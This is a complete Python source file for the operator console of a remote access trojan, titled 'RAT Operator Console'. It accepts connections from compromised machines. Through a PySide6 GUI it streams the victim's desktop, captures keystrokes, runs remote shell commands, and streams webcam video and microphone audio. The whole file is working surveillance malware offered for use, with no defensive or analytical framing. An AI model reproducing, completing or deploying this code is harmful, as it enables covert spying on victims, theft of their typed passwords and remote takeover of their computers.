"""
operator.py - Remote Administration Operator Console
Listens for incoming agent connections and provides a GUI to monitor/control them.
Requires: PySide6, Pillow, numpy, pyaudio (optional)
"""

import socket
import threading
import struct
import time
import io
import json
import sys
import queue
import numpy as np

from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QTextEdit, QTabWidget, QLineEdit,
    QSplitter, QFrame, QListWidget, QListWidgetItem, QStatusBar,
    QGroupBox, QScrollArea, QSizePolicy
)
from PySide6.QtCore import (
    Qt, QTimer, Signal, QObject, QThread, Slot
)
from PySide6.QtGui import (
    QPixmap, QImage, QFont, QColor, QPalette, QTextCursor,
    QFontDatabase
)

# ─── SERVER SETTINGS ─────────────────────────────────────────────────────────
HOST = "0.0.0.0"
PORT = 9999
# ─────────────────────────────────────────────────────────────────────────────

# Optional audio playback
try:
    import pyaudio
    HAS_PYAUDIO = True
except ImportError:
    HAS_PYAUDIO = False

# ─── PROTOCOL CONSTANTS ──────────────────────────────────────────────────────
CMD_START_SCREEN   = b'\x01'
CMD_STOP_SCREEN    = b'\x02'
CMD_START_KEYLOG   = b'\x03'
CMD_STOP_KEYLOG    = b'\x04'
CMD_SHELL_INPUT    = b'\x05'
CMD_START_CAM      = b'\x06'
CMD_STOP_CAM       = b'\x07'
CMD_START_AUDIO    = b'\x08'
CMD_STOP_AUDIO     = b'\x09'
CMD_SHELL_OUTPUT   = b'\x0A'
CMD_SCREEN_FRAME   = b'\x0B'
CMD_KEY_EVENT      = b'\x0C'
CMD_CAM_FRAME      = b'\x0D'
CMD_AUDIO_CHUNK    = b'\x0E'
CMD_PING           = b'\x0F'
CMD_PONG           = b'\x10'
CMD_INFO           = b'\x11'

# ─── STYLESHEET ──────────────────────────────────────────────────────────────
DARK_STYLE = """
QMainWindow, QWidget {
    background-color: #0d1117;
    color: #c9d1d9;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 13px;
}
QTabWidget::pane {
    border: 1px solid #30363d;
    background-color: #161b22;
}
QTabBar::tab {
    background-color: #0d1117;
    color: #8b949e;
    padding: 8px 20px;
    border: 1px solid #30363d;
    border-bottom: none;
    font-size: 12px;
    letter-spacing: 1px;
}
QTabBar::tab:selected {
    background-color: #161b22;
    color: #58a6ff;
    border-top: 2px solid #58a6ff;
}
QTabBar::tab:hover {
    color: #c9d1d9;
    background-color: #1c2128;
}
QPushButton {
    background-color: #21262d;
    color: #c9d1d9;
    border: 1px solid #30363d;
    border-radius: 4px;
    padding: 6px 16px;
    font-size: 12px;
    letter-spacing: 0.5px;
}
QPushButton:hover {
    background-color: #30363d;
    border-color: #8b949e;
}
QPushButton:pressed {
    background-color: #161b22;
}
QPushButton#btnStart {
    background-color: #1a3a1a;
    color: #3fb950;
    border-color: #3fb950;
}
QPushButton#btnStart:hover {
    background-color: #2d5a2d;
}
QPushButton#btnStop {
    background-color: #3a1a1a;
    color: #f85149;
    border-color: #f85149;
}
QPushButton#btnStop:hover {
    background-color: #5a2d2d;
}
QTextEdit {
    background-color: #0d1117;
    color: #c9d1d9;
    border: 1px solid #30363d;
    border-radius: 4px;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
    selection-background-color: #264f78;
}
QLineEdit {
    background-color: #0d1117;
    color: #c9d1d9;
    border: 1px solid #30363d;
    border-radius: 4px;
    padding: 6px 10px;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
}
QLineEdit:focus {
    border-color: #58a6ff;
}
QListWidget {
    background-color: #0d1117;
    color: #c9d1d9;
    border: 1px solid #30363d;
    border-radius: 4px;
}
QListWidget::item {
    padding: 8px;
    border-bottom: 1px solid #21262d;
}
QListWidget::item:selected {
    background-color: #1c2128;
    color: #58a6ff;
}
QListWidget::item:hover {
    background-color: #161b22;
}
QGroupBox {
    border: 1px solid #30363d;
    border-radius: 6px;
    margin-top: 12px;
    padding-top: 8px;
    color: #8b949e;
    font-size: 11px;
    letter-spacing: 1px;
}
QGroupBox::title {
    subcontrol-origin: margin;
    left: 12px;
    padding: 0 6px;
}
QLabel#display {
    background-color: #000000;
    border: 1px solid #30363d;
}
QStatusBar {
    background-color: #161b22;
    color: #8b949e;
    border-top: 1px solid #30363d;
    font-size: 11px;
}
QSplitter::handle {
    background-color: #30363d;
}
QScrollBar:vertical {
    background: #0d1117;
    width: 8px;
}
QScrollBar::handle:vertical {
    background: #30363d;
    border-radius: 4px;
}
QScrollBar::handle:vertical:hover {
    background: #8b949e;
}
"""

# ─── NETWORK HELPERS ─────────────────────────────────────────────────────────

def send_packet(sock, cmd, data=b''):
    length = struct.pack('>I', len(data))
    try:
        sock.sendall(cmd + length + data)
    except Exception:
        pass


def recv_packet(sock):
    try:
        header = _recv_exact(sock, 5)
        if not header:
            return None, None
        cmd = header[:1]
        length = struct.unpack('>I', header[1:])[0]
        data = _recv_exact(sock, length) if length else b''
        return cmd, data
    except Exception:
        return None, None


def _recv_exact(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


# ─── SIGNALS BRIDGE ──────────────────────────────────────────────────────────

class AgentSignals(QObject):
    screen_frame  = Signal(bytes)
    key_event     = Signal(str)
    shell_output  = Signal(bytes)
    cam_frame     = Signal(bytes)
    audio_chunk   = Signal(bytes)
    info_received = Signal(dict)
    disconnected  = Signal()


# ─── AGENT SESSION (runs in a thread) ────────────────────────────────────────

class AgentSession:
    """Represents a connected remote agent."""

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.signals = AgentSignals()
        self.info = {"hostname": addr[0], "os": "unknown", "caps": {}}
        self.running = True
        self.thread = threading.Thread(target=self._recv_loop, daemon=True)
        self.thread.start()

    @property
    def label(self):
        return f"{self.info.get('hostname', self.addr[0])} [{self.addr[0]}:{self.addr[1]}]"

    def send(self, cmd, data=b''):
        send_packet(self.sock, cmd, data)

    def _recv_loop(self):
        while self.running:
            cmd, data = recv_packet(self.sock)
            if cmd is None:
                self.running = False
                self.signals.disconnected.emit()
                return
            self._dispatch(cmd, data)

    def _dispatch(self, cmd, data):
        if cmd == CMD_INFO:
            try:
                self.info = json.loads(data.decode())
                self.signals.info_received.emit(self.info)
            except Exception:
                pass
        elif cmd == CMD_SCREEN_FRAME:
            self.signals.screen_frame.emit(data)
        elif cmd == CMD_KEY_EVENT:
            try:
                self.signals.key_event.emit(data.decode())
            except Exception:
                pass
        elif cmd == CMD_SHELL_OUTPUT:
            self.signals.shell_output.emit(data)
        elif cmd == CMD_CAM_FRAME:
            self.signals.cam_frame.emit(data)
        elif cmd == CMD_AUDIO_CHUNK:
            self.signals.audio_chunk.emit(data)
        elif cmd == CMD_PONG:
            pass

    def disconnect(self):
        self.running = False
        try:
            self.sock.close()
        except Exception:
            pass


# ─── AUDIO PLAYER ────────────────────────────────────────────────────────────

class AudioPlayer:
    """Plays incoming PCM chunks in real-time."""

    RATE = 16000
    CHUNK = 1024
    CHANNELS = 1

    def __init__(self):
        self.stream = None
        self.pa = None
        if HAS_PYAUDIO:
            self.pa = pyaudio.PyAudio()

    def start(self):
        if not HAS_PYAUDIO:
            return
        try:
            self.stream = self.pa.open(
                format=pyaudio.paInt16,
                channels=self.CHANNELS,
                rate=self.RATE,
                output=True,
                frames_per_buffer=self.CHUNK
            )
        except Exception:
            pass

    def play(self, data):
        if self.stream:
            try:
                self.stream.write(data)
            except Exception:
                pass

    def stop(self):
        if self.stream:
            try:
                self.stream.stop_stream()
                self.stream.close()
            except Exception:
                pass
            self.stream = None


# ─── TAB: DESKTOP REMOTE ─────────────────────────────────────────────────────

class ScreenTab(QWidget):
    def __init__(self, session: AgentSession):
        super().__init__()
        self.session = session
        self.active = False
        self._build_ui()
        session.signals.screen_frame.connect(self._on_frame)

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(6)

        ctrl = QHBoxLayout()
        self.btn_start = QPushButton("▶  START STREAM")
        self.btn_start.setObjectName("btnStart")
        self.btn_stop  = QPushButton("■  STOP STREAM")
        self.btn_stop.setObjectName("btnStop")
        self.lbl_fps   = QLabel("FPS: --")
        self.lbl_fps.setStyleSheet("color: #8b949e; font-size: 11px;")
        ctrl.addWidget(self.btn_start)
        ctrl.addWidget(self.btn_stop)
        ctrl.addStretch()
        ctrl.addWidget(self.lbl_fps)
        layout.addLayout(ctrl)

        self.display = QLabel()
        self.display.setObjectName("display")
        self.display.setAlignment(Qt.AlignCenter)
        self.display.setMinimumSize(640, 400)
        self.display.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.display.setText("[ No stream — press START ]")
        self.display.setStyleSheet("color: #30363d; font-size: 16px; background: #000;")
        layout.addWidget(self.display)

        self.btn_start.clicked.connect(self._start)
        self.btn_stop.clicked.connect(self._stop)

        self._last_frame_time = 0
        self._frame_count = 0
        self._fps_timer = QTimer()
        self._fps_timer.timeout.connect(self._update_fps)
        self._fps_timer.start(1000)

    def _start(self):
        self.active = True
        self.session.send(CMD_START_SCREEN)

    def _stop(self):
        self.active = False
        self.session.send(CMD_STOP_SCREEN)
        self.display.setText("[ Stream stopped ]")

    @Slot(bytes)
    def _on_frame(self, data):
        if not self.active:
            return
        if data.startswith(b'ERROR'):
            self.display.setText(data.decode())
            return
        self._frame_count += 1
        img = QImage.fromData(data)
        if not img.isNull():
            pix = QPixmap.fromImage(img)
            self.display.setPixmap(
                pix.scaled(self.display.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
            )

    def _update_fps(self):
        self.lbl_fps.setText(f"FPS: {self._frame_count}")
        self._frame_count = 0


# ─── TAB: KEYLOGGER ──────────────────────────────────────────────────────────

class KeylogTab(QWidget):
    MAX_KEYS = 500

    def __init__(self, session: AgentSession):
        super().__init__()
        self.session = session
        self.active = False
        self.key_buffer = []
        self._build_ui()
        session.signals.key_event.connect(self._on_event)

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(6)

        ctrl = QHBoxLayout()
        self.btn_start = QPushButton("▶  START CAPTURE")
        self.btn_start.setObjectName("btnStart")
        self.btn_stop  = QPushButton("■  STOP CAPTURE")
        self.btn_stop.setObjectName("btnStop")
        self.btn_clear = QPushButton("⌫  CLEAR")
        ctrl.addWidget(self.btn_start)
        ctrl.addWidget(self.btn_stop)
        ctrl.addWidget(self.btn_clear)
        ctrl.addStretch()
        layout.addLayout(ctrl)

        # Live key display
        live_group = QGroupBox("LIVE KEYSTREAM")
        live_layout = QVBoxLayout(live_group)
        self.live_display = QLabel()
        self.live_display.setWordWrap(True)
        self.live_display.setStyleSheet(
            "background: #000; color: #3fb950; font-family: Consolas, monospace; "
            "font-size: 14px; padding: 10px; border: 1px solid #30363d;"
        )
        self.live_display.setMinimumHeight(60)
        self.live_display.setText("")
        live_layout.addWidget(self.live_display)
        layout.addWidget(live_group)

        # Event log
        log_group = QGroupBox("EVENT LOG")
        log_layout = QVBoxLayout(log_group)
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        log_layout.addWidget(self.log)
        layout.addWidget(log_group, 1)

        self.btn_start.clicked.connect(self._start)
        self.btn_stop.clicked.connect(self._stop)
        self.btn_clear.clicked.connect(self._clear)

        self._live_text = ""

    def _start(self):
        self.active = True
        self.session.send(CMD_START_KEYLOG)

    def _stop(self):
        self.active = False
        self.session.send(CMD_STOP_KEYLOG)

    def _clear(self):
        self.log.clear()
        self._live_text = ""
        self.live_display.setText("")

    @Slot(str)
    def _on_event(self, event_json):
        if not self.active:
            return
        try:
            ev = json.loads(event_json)
        except Exception:
            return

        key = ev.get("key", "")
        etype = ev.get("type", "")
        ts = time.strftime("%H:%M:%S", time.localtime(ev.get("ts", time.time())))

        if etype == "press":
            # Update live stream
            if len(key) == 1:
                self._live_text += key
            else:
                self._live_text += f"[{key}]"
            if len(self._live_text) > 80:
                self._live_text = self._live_text[-80:]
            self.live_display.setText(self._live_text)

            # Color by type
            if len(key) == 1:
                color = "#c9d1d9"
            elif "Key.space" in key:
                color = "#58a6ff"
                key = "SPACE"
            elif "Key.enter" in key or "Key.return" in key:
                color = "#3fb950"
                key = "ENTER"
            elif "Key.backspace" in key:
                color = "#f85149"
                key = "BACKSPACE"
            elif "Key.ctrl" in key or "Key.alt" in key or "Key.shift" in key:
                color = "#d29922"
            else:
                color = "#8b949e"

            self.log.setTextColor(QColor("#8b949e"))
            self.log.insertPlainText(f"[{ts}] ")
            self.log.setTextColor(QColor(color))
            self.log.insertPlainText(f"{key}\n")
            self.log.moveCursor(QTextCursor.End)
            # Keep log under 2000 lines
            doc = self.log.document()
            while doc.blockCount() > 2000:
                cursor = QTextCursor(doc.begin())
                cursor.select(QTextCursor.BlockUnderCursor)
                cursor.movePosition(QTextCursor.NextCharacter, QTextCursor.KeepAnchor)
                cursor.removeSelectedText()


# ─── TAB: TERMINAL ───────────────────────────────────────────────────────────

class TerminalTab(QWidget):
    def __init__(self, session: AgentSession):
        super().__init__()
        self.session = session
        self._build_ui()
        session.signals.shell_output.connect(self._on_output)

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(6)

        info = QLabel("Shell session — commands are sent directly to the remote shell.")
        info.setStyleSheet("color: #8b949e; font-size: 11px;")
        layout.addWidget(info)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet(
            "background: #000; color: #c9d1d9; font-family: Consolas, monospace; font-size: 13px;"
        )
        layout.addWidget(self.output, 1)

        input_row = QHBoxLayout()
        self.prompt_label = QLabel("$")
        self.prompt_label.setStyleSheet("color: #3fb950; font-size: 14px; padding: 0 6px;")
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Enter command and press Enter...")
        self.btn_send = QPushButton("SEND")
        input_row.addWidget(self.prompt_label)
        input_row.addWidget(self.cmd_input, 1)
        input_row.addWidget(self.btn_send)
        layout.addLayout(input_row)

        self.btn_send.clicked.connect(self._send_cmd)
        self.cmd_input.returnPressed.connect(self._send_cmd)

        self._write_system("Terminal ready. Type a command to start a shell session.\n")

    def _send_cmd(self):
        cmd = self.cmd_input.text()
        if not cmd:
            return
        self.cmd_input.clear()
        self._write_prompt(cmd)
        self.session.send(CMD_SHELL_INPUT, (cmd + "\n").encode())

    @Slot(bytes)
    def _on_output(self, data):
        try:
            text = data.decode('utf-8', errors='replace')
        except Exception:
            text = repr(data)
        self.output.setTextColor(QColor("#c9d1d9"))
        self.output.insertPlainText(text)
        self.output.moveCursor(QTextCursor.End)

    def _write_prompt(self, text):
        self.output.setTextColor(QColor("#3fb950"))
        self.output.insertPlainText(f"$ {text}\n")
        self.output.moveCursor(QTextCursor.End)

    def _write_system(self, text):
        self.output.setTextColor(QColor("#30363d"))
        self.output.insertPlainText(text)
        self.output.moveCursor(QTextCursor.End)


# ─── TAB: WEBCAM ─────────────────────────────────────────────────────────────

class CamTab(QWidget):
    def __init__(self, session: AgentSession):
        super().__init__()
        self.session = session
        self.active = False
        self._build_ui()
        session.signals.cam_frame.connect(self._on_frame)

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(6)

        ctrl = QHBoxLayout()
        self.btn_start = QPushButton("▶  START CAM")
        self.btn_start.setObjectName("btnStart")
        self.btn_stop  = QPushButton("■  STOP CAM")
        self.btn_stop.setObjectName("btnStop")
        self.lbl_fps   = QLabel("FPS: --")
        self.lbl_fps.setStyleSheet("color: #8b949e; font-size: 11px;")
        ctrl.addWidget(self.btn_start)
        ctrl.addWidget(self.btn_stop)
        ctrl.addStretch()
        ctrl.addWidget(self.lbl_fps)
        layout.addLayout(ctrl)

        self.display = QLabel()
        self.display.setObjectName("display")
        self.display.setAlignment(Qt.AlignCenter)
        self.display.setMinimumSize(640, 400)
        self.display.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.display.setText("[ No webcam stream — press START ]")
        self.display.setStyleSheet("color: #30363d; font-size: 16px; background: #000;")
        layout.addWidget(self.display)

        self.btn_start.clicked.connect(self._start)
        self.btn_stop.clicked.connect(self._stop)

        self._frame_count = 0
        self._fps_timer = QTimer()
        self._fps_timer.timeout.connect(self._update_fps)
        self._fps_timer.start(1000)

    def _start(self):
        self.active = True
        self.session.send(CMD_START_CAM)

    def _stop(self):
        self.active = False
        self.session.send(CMD_STOP_CAM)
        self.display.setText("[ Cam stopped ]")

    @Slot(bytes)
    def _on_frame(self, data):
        if not self.active:
            return
        if data.startswith(b'ERROR'):
            self.display.setText(data.decode())
            return
        self._frame_count += 1
        img = QImage.fromData(data)
        if not img.isNull():
            pix = QPixmap.fromImage(img)
            self.display.setPixmap(
                pix.scaled(self.display.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
            )

    def _update_fps(self):
        self.lbl_fps.setText(f"FPS: {self._frame_count}")
        self._frame_count = 0


# ─── TAB: AUDIO ──────────────────────────────────────────────────────────────

class AudioTab(QWidget):
    def __init__(self, session: AgentSession):
        super().__init__()
        self.session = session
        self.active = False
        self.player = AudioPlayer()
        self._chunk_count = 0
        self._build_ui()
        session.signals.audio_chunk.connect(self._on_chunk)

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(10)

        ctrl = QHBoxLayout()
        self.btn_start = QPushButton("▶  START AUDIO")
        self.btn_start.setObjectName("btnStart")
        self.btn_stop  = QPushButton("■  STOP AUDIO")
        self.btn_stop.setObjectName("btnStop")
        ctrl.addWidget(self.btn_start)
        ctrl.addWidget(self.btn_stop)
        ctrl.addStretch()
        layout.addLayout(ctrl)

        status_group = QGroupBox("STREAM STATUS")
        status_layout = QVBoxLayout(status_group)
        self.lbl_status = QLabel("Idle")
        self.lbl_status.setStyleSheet("color: #8b949e; font-size: 13px; padding: 6px;")
        self.lbl_chunks = QLabel("Chunks received: 0")
        self.lbl_chunks.setStyleSheet("color: #8b949e; font-size: 12px; padding: 4px;")
        if not HAS_PYAUDIO:
            warn = QLabel("⚠  pyaudio not installed — audio will be received but not played back.")
            warn.setStyleSheet("color: #d29922; font-size: 12px; padding: 4px;")
            status_layout.addWidget(warn)
        status_layout.addWidget(self.lbl_status)
        status_layout.addWidget(self.lbl_chunks)
        layout.addWidget(status_group)

        # VU meter
        vu_group = QGroupBox("LEVEL METER")
        vu_layout = QVBoxLayout(vu_group)
        self.vu_bar = QLabel()
        self.vu_bar.setMinimumHeight(30)
        self.vu_bar.setStyleSheet("background: #000; border: 1px solid #30363d;")
        vu_layout.addWidget(self.vu_bar)
        layout.addWidget(vu_group)

        layout.addStretch()

        self.btn_start.clicked.connect(self._start)
        self.btn_stop.clicked.connect(self._stop)

        self._vu_timer = QTimer()
        self._vu_timer.timeout.connect(self._update_chunks_label)
        self._vu_timer.start(500)

    def _start(self):
        self.active = True
        self.player.start()
        self.session.send(CMD_START_AUDIO)
        self.lbl_status.setText("● STREAMING")
        self.lbl_status.setStyleSheet("color: #3fb950; font-size: 13px; padding: 6px;")

    def _stop(self):
        self.active = False
        self.player.stop()
        self.session.send(CMD_STOP_AUDIO)
        self.lbl_status.setText("Idle")
        self.lbl_status.setStyleSheet("color: #8b949e; font-size: 13px; padding: 6px;")

    @Slot(bytes)
    def _on_chunk(self, data):
        if not self.active:
            return
        if data.startswith(b'ERROR'):
            self.lbl_status.setText(data.decode())
            return
        self._chunk_count += 1
        self.player.play(data)
        try:
            samples = np.frombuffer(data, dtype=np.int16).astype(np.float32)
            level = min(int(np.abs(samples).mean() / 200), 100)
            color = "#3fb950" if level < 60 else ("#d29922" if level < 85 else "#f85149")
            bar_width = level
            self.vu_bar.setStyleSheet(
                f"background: qlineargradient(x1:0,y1:0,x2:1,y2:0,"
                f"stop:0 {color}, stop:{bar_width/100:.2f} {color}, "
                f"stop:{bar_width/100+0.001:.2f} #21262d, stop:1 #21262d);"
                f"border: 1px solid #30363d;"
            )
        except Exception:
            pass

    def _update_chunks_label(self):
        self.lbl_chunks.setText(f"Chunks received: {self._chunk_count}")


# ─── AGENT PANEL ─────────────────────────────────────────────────────────────

class AgentPanel(QWidget):
    def __init__(self, session: AgentSession):
        super().__init__()
        self.session = session
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)

        info_bar = QHBoxLayout()
        self.lbl_info = QLabel(f"● Connected: {self.session.label}")
        self.lbl_info.setStyleSheet("color: #3fb950; font-size: 12px; padding: 4px 8px;")
        self.btn_disconnect = QPushButton("DISCONNECT")
        self.btn_disconnect.setObjectName("btnStop")
        self.btn_disconnect.setFixedWidth(120)
        info_bar.addWidget(self.lbl_info)
        info_bar.addStretch()
        info_bar.addWidget(self.btn_disconnect)
        layout.addLayout(info_bar)

        self.tabs = QTabWidget()
        self.screen_tab   = ScreenTab(self.session)
        self.keylog_tab   = KeylogTab(self.session)
        self.terminal_tab = TerminalTab(self.session)
        self.cam_tab      = CamTab(self.session)
        self.audio_tab    = AudioTab(self.session)

        self.tabs.addTab(self.screen_tab,   "🖥  DESKTOP")
        self.tabs.addTab(self.keylog_tab,   "⌨  KEYLOGGER")
        self.tabs.addTab(self.terminal_tab, "  TERMINAL")
        self.tabs.addTab(self.cam_tab,      "📷  WEBCAM")
        self.tabs.addTab(self.audio_tab,    "🎤  AUDIO")
        layout.addWidget(self.tabs)

        self.btn_disconnect.clicked.connect(lambda: self.session.disconnect())
        self.session.signals.info_received.connect(self._on_info)

    @Slot(dict)
    def _on_info(self, info):
        self.lbl_info.setText(
            f"● {info.get('hostname','?')} | {info.get('os','?')} | {self.session.addr[0]}:{self.session.addr[1]}"
        )


# ─── SERVER LISTENER THREAD ──────────────────────────────────────────────────

class ServerListener(QObject):
    new_connection = Signal(object, tuple)

    def __init__(self):
        super().__init__()
        self._running = False
        self._thread = None

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._listen, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

    def _listen(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT))
        srv.listen(16)
        srv.settimeout(1.0)
        print(f"Listening on {HOST}:{PORT}")
        while self._running:
            try:
                conn, addr = srv.accept()
                print(f"New connection from {addr}")
                self.new_connection.emit(conn, addr)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"Server error: {e}")
                break
        srv.close()


# ─── MAIN WINDOW ─────────────────────────────────────────────────────────────

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RAT Operator Console")
        self.resize(1200, 800)
        self.sessions = {}
        self.panels   = {}
        self._build_ui()
        self._start_server()

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QHBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # Sidebar
        sidebar = QFrame()
        sidebar.setFixedWidth(240)
        sidebar.setStyleSheet("background: #161b22; border-right: 1px solid #30363d;")
        side_layout = QVBoxLayout(sidebar)
        side_layout.setContentsMargins(8, 12, 8, 8)
        side_layout.setSpacing(8)

        logo = QLabel("RAT CONSOLE")
        logo.setStyleSheet(
            "color: #58a6ff; font-size: 14px; font-weight: bold; "
            "letter-spacing: 3px; padding: 8px 4px;"
        )
        side_layout.addWidget(logo)

        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setStyleSheet("background: #30363d;")
        side_layout.addWidget(line)

        self.lbl_status = QLabel("● LISTENING")
        self.lbl_status.setStyleSheet("color: #3fb950; font-size: 11px; padding: 2px 4px;")
        side_layout.addWidget(self.lbl_status)

        conn_group = QGroupBox("CONNECTIONS")
        conn_layout = QVBoxLayout(conn_group)
        conn_layout.setContentsMargins(4, 4, 4, 4)
        self.agent_list = QListWidget()
        self.agent_list.setMinimumHeight(200)
        conn_layout.addWidget(self.agent_list)
        side_layout.addWidget(conn_group)

        self.lbl_count = QLabel("Agents: 0")
        self.lbl_count.setStyleSheet("color: #8b949e; font-size: 11px; padding: 2px 4px;")
        side_layout.addWidget(self.lbl_count)

        side_layout.addStretch()

        about = QLabel(f"Listening on :{PORT}")
        about.setStyleSheet("color: #30363d; font-size: 10px; padding: 4px;")
        side_layout.addWidget(about)

        # Main area
        self.main_area = QWidget()
        self.main_area.setStyleSheet("background: #0d1117;")
        self.main_layout = QVBoxLayout(self.main_area)
        self.main_layout.setContentsMargins(0, 0, 0, 0)

        self.welcome = QLabel(
            "Waiting for agent connections...\n\n"
            f"Server listening on port {PORT}"
        )
        self.welcome.setAlignment(Qt.AlignCenter)
        self.welcome.setStyleSheet("color: #30363d; font-size: 18px;")
        self.main_layout.addWidget(self.welcome)

        root.addWidget(sidebar)
        root.addWidget(self.main_area, 1)

        self.agent_list.currentRowChanged.connect(self._on_agent_selected)

        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage(f"Server started — listening on {HOST}:{PORT}")

    def _start_server(self):
        self.listener = ServerListener()
        self.listener.new_connection.connect(self._on_new_connection)
        self.listener.start()

    @Slot(object, tuple)
    def _on_new_connection(self, sock, addr):
        key = f"{addr[0]}:{addr[1]}"
        session = AgentSession(sock, addr)
        panel = AgentPanel(session)

        self.sessions[key] = session
        self.panels[key] = panel

        self.welcome.hide()

        item = QListWidgetItem(f"⬤  {addr[0]}:{addr[1]}")
        item.setData(Qt.UserRole, key)
        item.setForeground(QColor("#3fb950"))
        self.agent_list.addItem(item)
        self.agent_list.setCurrentRow(self.agent_list.count() - 1)

        self.main_layout.addWidget(panel)
        self._show_panel(key)
        self._update_count()

        session.signals.disconnected.connect(lambda: self._on_disconnected(key))
        session.signals.info_received.connect(lambda info: self._on_agent_info(key, info))

        self.status_bar.showMessage(f"New connection from {addr[0]}:{addr[1]}")

    def _on_disconnected(self, key):
        for i in range(self.agent_list.count()):
            item = self.agent_list.item(i)
            if item.data(Qt.UserRole) == key:
                item.setForeground(QColor("#f85149"))
                item.setText(item.text().replace("⬤", "○"))
                break
        self._update_count()
        self.status_bar.showMessage(f"Agent disconnected: {key}")

    def _on_agent_info(self, key, info):
        for i in range(self.agent_list.count()):
            item = self.agent_list.item(i)
            if item.data(Qt.UserRole) == key:
                host = info.get("hostname", key)
                item.setText(f"⬤  {host}")
                break

    def _on_agent_selected(self, row):
        if row < 0:
            return
        item = self.agent_list.item(row)
        key = item.data(Qt.UserRole)
        self._show_panel(key)

    def _show_panel(self, key):
        for k, panel in self.panels.items():
            panel.setVisible(k == key)

    def _update_count(self):
        active = sum(1 for s in self.sessions.values() if s.running)
        self.lbl_count.setText(f"Agents: {active}/{len(self.sessions)}")


# ─── ENTRY POINT ─────────────────────────────────────────────────────────────

if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyleSheet(DARK_STYLE)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())